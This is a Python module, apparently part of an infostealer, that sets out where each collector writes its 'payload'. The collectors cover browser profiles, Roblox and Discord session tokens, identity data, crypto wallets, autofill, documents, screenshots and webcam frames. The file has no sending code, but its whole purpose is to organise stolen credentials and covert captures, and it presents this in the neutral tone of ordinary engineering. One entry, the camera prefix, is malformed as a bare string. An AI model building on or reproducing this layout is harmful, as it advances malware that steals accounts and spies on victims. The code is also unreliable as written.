"""Where a collector writes, in one place.

The payload used to be whatever each collector felt like: five JSON files at the root,
two session text files beside them, three trees underneath. A reader could not tell a
module from a stray file, and a module could not be moved without editing it.

This module is the contract instead. Every collector is handed its own directory by
``sources.run_all``; nothing under ``agent/`` builds a path from the workspace root
except ``entry`` for the two files it owns. ``tests/test_contracts.py`` runs the whole
pipeline and fails on any file that lands where its module does not own it.

Two modules share ``captures/`` on purpose — a screenshot and a webcam frame belong
together — so ownership is by filename prefix as well as by directory.
"""

from __future__ import annotations

from pathlib import Path
from typing import Any, Final

# Bumped when the shape below changes. It travels in ``manifest.json`` so an archive
# says which layout it uses without anybody having to guess from the paths. It is not
# the config schema: cfg.json stayed at 1, because an old config and a new layout are
# not the same contract and tying them together would have forced a migration for no
# reader's benefit.
LAYOUT_VERSION: Final[int] = 3

MANIFEST_MEMBER: Final[str] = "manifest.json"
SUMMARY_MEMBER: Final[str] = "summary.txt"
META_DIR: Final[str] = "meta"

# The two files entry writes itself. Everything else belongs to a module.
ROOT_MEMBERS: Final[tuple[str, ...]] = (MANIFEST_MEMBER, SUMMARY_MEMBER)
META_FILES: Final[tuple[str, ...]] = ("gate.json", "environment.json", "errors.json", "state.json")

# module name -> directory under the workspace root
MODULE_DIRS: Final[dict[str, str]] = {
    "system": "system",
    "network": "system",
    "displays": "system",
    "browsers": "browsers",
    "roblox": "accounts",
    "sessions": "accounts",
    "identity": "accounts",
    "wallets": "wallets",
    "autofill": "autofill",
    "documents": "documents",
    "screen": "captures",
    "camera": "captures",
}

# module name -> filename prefixes it is allowed to create inside its directory.
# A module that writes a JSON summary and a tree of files declares both.
MODULE_PREFIXES: Final[dict[str, tuple[str, ...]]] = {
    "system": ("system.json",),
    "network": ("network.json",),
    "displays": ("displays.json",),
    "browsers": ("",),  # one tree per browser/profile, all of it owned
    "roblox": ("roblox_session.txt", "roblox_status.json"),
    "sessions": ("discord_session.txt", "sessions.json"),
    "identity": ("identity.json", "session_status.json"),
    "wallets": ("",),
    "autofill": ("",),
    "documents": ("documents.json",),
    "screen": ("screen-", "screen.json"),
    "camera": ("camera."),
}

# Modules whose directory is shared, and the file names that disambiguate them.
SHARED_DIRS: Final[dict[str, tuple[str, ...]]] = {
    "captures": ("screen", "camera"),
    "accounts": ("roblox", "sessions", "identity"),
    "system": ("system", "network", "displays"),
}


def module_dir(root: Path, module: str) -> Path:
    """The directory one module owns. Created on call; a missing dir is not an error."""
    relative = MODULE_DIRS[module]
    path = root / relative
    path.mkdir(parents=True, exist_ok=True)
    return path


def meta_dir(root: Path) -> Path:
    path = root / META_DIR
    path.mkdir(parents=True, exist_ok=True)
    return path


def prepare(root: Path) -> Path:
    """Create every directory the enabled layout can need, once, before collection."""
    for relative in sorted(set(MODULE_DIRS.values()) | {META_DIR}):
        (root / relative).mkdir(parents=True, exist_ok=True)
    return root


def owns(module: str, relative: str) -> bool:
    """True when ``module`` may write ``relative`` (a workspace-relative posix path).

    Used by the contract test that walks a finished workspace. A path is owned when it
    starts with the module's directory and, for a shared directory, matches one of the
    module's declared filename prefixes.
    """
    if module not in MODULE_DIRS:
        return False
    directory = MODULE_DIRS[module]
    if not relative.startswith(directory + "/"):
        return False
    rest = relative[len(directory) + 1 :]
    prefixes = MODULE_PREFIXES[module]
    if prefixes == ("",):
        return True
    # A tree written under the module's directory (browsers, wallets) is owned by the
    # module that declares the empty prefix; otherwise only a declared name counts.
    return any(rest.startswith(prefix) for prefix in prefixes)


def classify(relative: str) -> tuple[str, ...]:
    """Every module that could have written ``relative``. Empty for root and meta."""
    if relative.startswith(META_DIR + "/"):
        return ()
    return tuple(
        sorted(name for name in MODULE_DIRS if owns(name, relative))
    )


def manifest(
    *,
    run_id: str,
    layout_version: int = LAYOUT_VERSION,
    **fields: Any,
) -> dict[str, Any]:
    """The root manifest. Fields are added by entry as the run produces them."""
    document: dict[str, Any] = {
        "layout_version": layout_version,
        "run_id": run_id,
        "members": len(MODULE_DIRS),
    }
    document.update(fields)
    return document


__all__ = [
    "LAYOUT_VERSION",
    "MANIFEST_MEMBER",
    "META_DIR",
    "META_FILES",
    "MODULE_DIRS",
    "MODULE_PREFIXES",
    "ROOT_MEMBERS",
    "SHARED_DIRS",
    "SUMMARY_MEMBER",
    "classify",
    "manifest",
    "meta_dir",
    "module_dir",
    "owns",
    "prepare",
]
